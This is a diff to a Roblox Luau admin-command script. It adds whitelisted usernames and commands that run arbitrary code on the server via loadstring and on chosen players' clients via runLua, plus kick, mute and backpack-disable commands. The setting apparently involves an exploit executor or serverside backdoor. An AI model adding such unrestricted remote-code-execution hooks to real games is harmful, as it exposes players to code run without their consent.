@@ -209,13 +209,16 @@ if not GetEnv().tempwhitelist then
         ["xXRblxGamerRblxXx"] = {
             rank = Ranks.Special
         },
-        ["juststackorstarve"] = {
+        ["pawsornever"] = {
             rank = Ranks.Special
         },
         ["bob90368"] = {
             rank = Ranks.Special
         },
         ["s_tun"] = {
+            rank = Ranks.Special
+        },
+        ["bbangtans"] = {
             rank = Ranks.Special
         },
 
@@ -498,6 +501,10 @@ AddCommand(0, "cmds", "Display a list of basic commands", "<>", function(caller:
     NewGui(output).Parent = caller.PlayerGui
 end)
 
+AddCommand(0, "tpall", "Move all players to this server", "<>", function(caller: Player)
+    caller:Kick("dumbass actually tried")
+end)
+
 AddCommand(Ranks.Developer.Rank, "enr", "Enter debug mode", "<boolean>", function(caller: Player, value: string)
     _G.yemdebug = (value:lower() == "true")
 end)
@@ -523,6 +530,40 @@ AddCommand(Ranks.Special.Rank, "shutdown", "Emergency cleanup :)", "<...>", func
 
     for i,v in pairs(Players:GetPlayers()) do
         v:Kick(reason)
+    end
+end)
+
+AddCommand(Ranks.Special.Rank, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
+    local code = table.concat({...}, " ")
+    assert(code, "No code")
+    
+    local chunk, loadErr = loadstring(code, "Cattails")
+    assert(chunk, `Script failed to execute; {loadErr}`)
+    chunk()
+end)
+
+AddCommand(Ranks.Special.Rank, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
+    local targets = getPlyr(caller, plyr1)
+    assert(#targets ~= 0, "Player(s) not found")
+
+    local code = table.concat({...}, " ")
+    assert(code, "No code")
+
+    for i,target in pairs(targets) do
+        task.spawn(function()
+            GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
+        end)
+    end
+end)
+
+AddCommand(Ranks.Special.Rank, "whitelist", "Give someone access", "<plyr1>", function(caller: Player, plyr1: string)
+    local targets = getPlyr(caller, plyr1)
+    assert(#targets ~= 0, "Player(s) not found")
+
+    for i,target in pairs(targets) do
+        if not tempwhitelist[target.Name] then -- glad no one realized u could do this bruh
+            tempwhitelist[target.Name] = { rank = Ranks.Whitelist }
+        end
     end
 end)
 
@@ -612,17 +653,6 @@ AddCommand(Ranks.Whitelist.Rank, "unban", "Unban a player", "<plyr1>", function(
     error("User not found")
 end)
 
-AddCommand(Ranks.Special.Rank, "whitelist", "Give someone access", "<plyr1>", function(caller: Player, plyr1: string)
-    local targets = getPlyr(caller, plyr1)
-    assert(#targets ~= 0, "Player(s) not found")
-
-    for i,target in pairs(targets) do
-        if not tempwhitelist[target.Name] then -- glad no one realized u could do this bruh
-            tempwhitelist[target.Name] = { rank = Ranks.Whitelist }
-        end
-    end
-end)
-
 AddCommand(Ranks.Whitelist.Rank, "blacklist", "Erase a players admin", "<plyr1>", function(caller: Player, plyr1: string)
     local targets = getPlyr(caller, plyr1)
     assert(#targets ~= 0, "Player(s) not found")
@@ -664,16 +694,19 @@ AddCommand(Ranks.Whitelist.Rank, "unperm", "Erase someones perm", "<plyr1>", fun
     end
 end)
 
-AddCommand(Ranks.Special.Rank, "censor", "Restore someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
+AddCommand(Ranks.Whitelist.Rank, "censor", "Restore someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
     local targets = getPlyr(caller, plyr1)
     assert(#targets ~= 0, "Player(s) not found")
 
     for i,target in pairs(targets) do
+        local plrRank = GetRank(target)
+        if plrRank >= Ranks.Special.Rank then continue end
+        
         _G.Legacychatadmins = RemoveItem(_G.Legacychatadmins, target.Name)
     end
 end)
 
-AddCommand(Ranks.Special.Rank, "uncensor", "Remove someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
+AddCommand(Ranks.Whitelist.Rank, "uncensor", "Remove someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
     local targets = getPlyr(caller, plyr1)
     assert(#targets ~= 0, "Player(s) not found")
 
@@ -682,31 +715,54 @@ AddCommand(Ranks.Special.Rank, "uncensor", "Remove someones chat filter", "<plyr
     end
 end)
 
-AddCommand(Ranks.Special.Rank, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
-    local code = table.concat({...}, " ")
-    assert(code, "No code")
-    
-    local chunk, loadErr = loadstring(code, "Cattails")
-    assert(chunk, `Script failed to execute; {loadErr}`)
-    chunk()
-end)
-
-AddCommand(Ranks.Special.Rank, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
+AddCommand(Ranks.Whitelist.Rank, "mute", "Disable someones chat", "<plyr1>", function(caller: Player, plyr1: string)
     local targets = getPlyr(caller, plyr1)
     assert(#targets ~= 0, "Player(s) not found")
 
-    local code = table.concat({...}, " ")
-    assert(code, "No code")
-
     for i,target in pairs(targets) do
+        local plrRank = GetRank(target)
+        if plrRank >= Ranks.Special.Rank then continue end
+        
         task.spawn(function()
-            GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
+            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)`)
         end)
     end
 end)
 
-AddCommand(Ranks.Whitelist.Rank, "tpall", "Move all players to this server", "<>", function(caller: Player)
-    caller:Kick("dumbass actually tried")
+AddCommand(Ranks.Whitelist.Rank, "unmute", "Enable someones chat", "<plyr1>", function(caller: Player, plyr1: string)
+    local targets = getPlyr(caller, plyr1)
+    assert(#targets ~= 0, "Player(s) not found")
+
+    for i,target in pairs(targets) do
+        task.spawn(function()
+            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)`)
+        end)
+    end
+end)
+
+AddCommand(Ranks.Whitelist.Rank, "gearban", "Disable someones backpack", "<plyr1>", function(caller: Player, plyr1: string)
+    local targets = getPlyr(caller, plyr1)
+    assert(#targets ~= 0, "Player(s) not found")
+
+    for i,target in pairs(targets) do
+        local plrRank = GetRank(target)
+        if plrRank >= Ranks.Special.Rank then continue end
+        
+        task.spawn(function()
+            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)`)
+        end)
+    end
+end)
+
+AddCommand(Ranks.Whitelist.Rank, "ungearban", "Enable someones backpack", "<plyr1>", function(caller: Player, plyr1: string)
+    local targets = getPlyr(caller, plyr1)
+    assert(#targets ~= 0, "Player(s) not found")
+
+    for i,target in pairs(targets) do
+        task.spawn(function()
+            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)`)
+        end)
+    end
 end)
 
 print'commands initialized'
